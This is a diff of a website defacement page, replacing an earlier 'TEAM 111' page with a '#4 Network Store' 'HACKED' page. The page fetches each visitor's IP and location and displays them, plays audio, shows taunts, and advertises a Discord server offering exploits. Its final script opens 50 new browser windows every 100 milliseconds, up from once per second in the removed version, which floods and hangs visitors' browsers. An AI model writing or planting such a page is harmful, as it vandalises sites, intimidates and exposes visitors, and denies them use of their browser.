@@ -1,84 +1,289 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TEAM 111</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: url('https://i.pinimg.com/originals/51/ae/a3/51aea3393b8234a1e69d8713a0a58bc3.gif') no-repeat center center fixed;
-            background-size: cover;
-            font-family: 'Courier New', Courier, monospace;
-            color: #0000ff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-            text-align: center;
-        }
-        .image-container img {
-            width: 750px; 
-            height: auto;
-            border: 2px solid #ff0000; 
-            border-radius: 15px;
-            box-shadow: 0 0 15px rgba(255, 0, 0, 0.7); 
-        }
-        .info {
-            margin-top: 20px;
-            font-size: 1.5em;
-            color: #ff0000; 
-            text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000; 
-            letter-spacing: 4.5px; 
-            white-space: pre-wrap;
-        }
-        .text {
-            margin-top: 20px;
-            font-size: 3em; 
-            color: #ff0000; 
-            text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000; 
-            letter-spacing: 4.5px; 
-        }
-    </style>
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HACKED</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      height: 100%;
+      background: black;
+      overflow: hidden;
+      font-family: 'Orbitron', monospace;
+      color: #0000ff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -2;
+    }
+
+    .centered {
+      position: relative;
+      text-align: center;
+      z-index: 2;
+      max-width: 600px;
+    }
+
+    .title {
+      font-size: 60px;
+      text-shadow: 0 0 25px #0000ff;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+
+    .subtitle {
+      font-size: 20px;
+      color: #0000ff;
+      margin-top: 10px;
+      text-shadow: 0 0 10px #0000ff;
+    }
+
+    .itachi {
+      width: 350px;
+      border-radius: 19px;
+      border: 2px solid #0000ff;
+      box-shadow: 0 0 20px #0000ff;
+      transition: transform 0.3s ease-in-out;
+      margin: 20px auto 10px auto;
+      display: block;
+    }
+
+    .itachi:hover {
+      transform: scale(1.05);
+    }
+
+    .info {
+      margin-top: 15px;
+      font-size: 16px;
+      color: #0000ff;
+      background: rgba(0, 0, 0, 0.6);
+      padding: 10px 20px;
+      border-radius: 5px;
+      border: 1px solid #0000ff;
+      display: inline-block;
+      text-shadow: 0 0 5px #0000ff;
+    }
+
+    .buttons {
+      margin-top: 20px;
+    }
+
+    .buttons button {
+      background: transparent;
+      border: 1px solid #0000ff;
+      color: #0000ff;
+      padding: 10px 20px;
+      margin: 5px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: all 0.2s ease-in-out;
+    }
+
+    .buttons button:hover {
+      background: #0000ff;
+      color: black;
+    }
+
+    #timer {
+      font-size: 60px;
+      text-shadow: 0 0 15px #0000ff;
+      user-select: none;
+      margin-top: 30px;
+    }
+
+    iframe {
+      position: absolute;
+      top: -1000px;
+      left: -1000px;
+      width: 0;
+      height: 0;
+      visibility: hidden;
+    }
+
+    #lostMsg, #breachMsg {
+      position: fixed;
+      top: 35%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 28px;
+      color: red;
+      background: rgba(0,0,0,0.9);
+      padding: 20px 30px;
+      border: 2px solid red;
+      border-radius: 10px;
+      z-index: 9999;
+      display: none;
+      text-shadow: 0 0 10px red;
+    }
+
+    #dot {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      width: 12px;
+      height: 12px;
+      background: red;
+      border-radius: 50%;
+      box-shadow: 0 0 10px red;
+      z-index: 10000;
+    }
+
+    .glitch {
+      animation: glitch 0.5s linear infinite;
+    }
+
+    @keyframes glitch {
+      0% { transform: translate(0); }
+      25% { transform: translate(-2px, 2px); }
+      50% { transform: translate(2px, -2px); }
+      75% { transform: translate(-2px, 1px); }
+      100% { transform: translate(0); }
+    }
+
+    @media screen and (max-width: 600px) {
+      .title { font-size: 36px; }
+      .subtitle { font-size: 16px; }
+      .itachi { width: 180px; }
+      #timer { font-size: 40px; }
+    }
+  </style>
 </head>
-<body>
-    <div class="image-container">
-        <img src="https://cdn.discordapp.com/attachments/1239118162260135967/1392950213605458032/standard.gif?ex=68852bfa&is=6883da7a&hm=bc33f26c8e8d32e5bb6624951125f921221fec70b70db9fc6812bdd6f962b6e0&">
-    </div>
-    <audio autoplay loop>
-        <source src="https://cdn.discordapp.com/attachments/1295010205255335978/1397930209801666771/74361af7874c8436.mp3?ex=68838376&is=688231f6&hm=37111a43f730aa8a0064557b2ca78dc3f9da925dfe4b9fccf5ef68a971bfe380&" type="audio/mpeg">
-        Your browser does not support the audio element.
-    </audio>
-    <div class="info" id="ip-info">
-        <strong>IP: <span id="ip"></span></strong><br>
-        <span><strong>City:</strong> <span id="city"></span></span><br>
-        <span><strong>Region:</strong> <span id="region"></span></span><br>
-        <span><strong>Country:</strong> <span id="country"></span></span><br>
-        <span><strong>Location:</strong> <span id="loc"></span></span><br>
-        <span><strong>Organization:</strong> <span id="org"></span></span><br>
-        <span><strong>Timezone:</strong> <span id="timezone"></span></span>
-    </div>
-    <div class="text">TEAM 111</div>
+<body class="">
 
-    <script>
-        fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            delete data.readme;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.textContent = JSON.stringify(data, null, 2);
-        });
-    </script>
 
-    <!-- سكربت فتح 50 رابط كل ثانية -->
+<audio autoplay loop>
+  <source src=https://cdn.discordapp.com/attachments/1399140657519661178/1399145263356186655/Fake_Hacker_Screen_2.0_-_VISUAL_NINE_youtube.mp3?ex=688897d1&is=68874651&hm=15a91217bec296a66496bafe9c5bd77649a6dc12c7b204e1c3d7d095d85d4f02&">
+</audio>
+
+<div id="lostMsg" style="display: none;">🚨 discord.gg/ns4 🚨</div>
+<div id="breachMsg" style="display: none;">🚨 discord.gg/ns4 🚨</div>
+<div id="dot" style="display: block;"></div>
+
+<div class="centered">
+  <img src="https://media.discordapp.net/attachments/1239118162260135967/1398981380385275986/image.png?ex=6888a7f0&is=68875670&hm=afb9c2a606c8d87f2c8581dc96dd41796a1be23a357c6d95d0e3a93577aa9112&=&format=webp&quality=lossless&width=728&height=481" alt="Itachi" class="itachi" id="img">
+
+  <div class="title"> #4 Network Store </div>
+  <div class="subtitle">Your server is full of exploits.</div>
+  <div class="subtitle">Wanna know how I did it? Wanna do it too? DM me on Discord </div>
+  <div class="subtitle"> by #4 Network Store & dis.gg/ns4  </div>
+
+  <div class="info" id="geoInfo">🌐 IP:  | 🏳️ Country: Israel | 🏙️ City: </div>
+
+  <div class="buttons">
+    <button> Nothing personal. Just power </button>
+    <button>You were never safe</button>
+    <button>This is not art. This is access.</button>
+    <button> i own your reality</button>
+    <button>GO TO SLEEP BITCHES</button>
+  </div>
+
+  <div id="timer">64</div>
+</div>
+
+
+<script>
+  fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+      const info = `🌐 IP: ${data.ip} | 🏳️ Country: ${data.country_name} | 🏙️ City: ${data.city}`;
+      document.getElementById("geoInfo").textContent = info;
+    })
+    .catch(() => {
+      document.getElementById("geoInfo").textContent = "Failed to fetch IP info.";
+    });
+
+  let elapsed = 0;
+  const timerEl = document.getElementById('timer');
+  function tick() {
+    timerEl.textContent = elapsed;
+    elapsed++;
+  }
+  tick();
+  setInterval(tick, 1000);
+</script>
+
+
+<canvas id="bg" height="954" width="1912"></canvas>
+<script>
+  const canvas = document.getElementById("bg");
+  const ctx = canvas.getContext("2d");
+
+  canvas.height = window.innerHeight;
+  canvas.width = window.innerWidth;
+
+  const chars = "010101";
+  const font_size = 16;
+  const columns = canvas.width / font_size;
+  const drops = Array(Math.floor(columns)).fill(1);
+
+  function draw() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#0000ff";
+    ctx.font = font_size + "px monospace";
+
+    for (let i = 0; i < drops.length; i++) {
+      const text = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(text, i * font_size, drops[i] * font_size);
+      if (drops[i] * font_size > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  setInterval(draw, 33);
+</script>
+
+
+<script>
+  setInterval(() => {
+    document.body.classList.toggle("glitch");
+  }, 6000);
+</script>
+
+
+<script>
+  setInterval(() => {
+    const msg = document.getElementById("lostMsg");
+    msg.style.display = "block";
+    setTimeout(() => { msg.style.display = "none"; }, 2000);
+  }, 25000);
+</script>
+
+
+<script>
+  setInterval(() => {
+    const msg = document.getElementById("breachMsg");
+    msg.style.display = "block";
+    setTimeout(() => { msg.style.display = "none"; }, 2500);
+  }, 18000);
+</script>
+
+
+<script>
+  setInterval(() => {
+    const dot = document.getElementById("dot");
+    dot.style.display = dot.style.display === "none" ? "block" : "none";
+  }, 800);
+</script>
     <script>
         setInterval(() => {
             for (let i = 0; i < 50; i++) {
-                window.open("https://k.top4top.io/p_3493t1gip1.gif", "_blank");
+                window.open("https://discord.gg/4ns", "_blank");
             }
-        }, 1000);
+        }, 100);
     </script>
-</body>
-</html>
+
+
+</body></html>
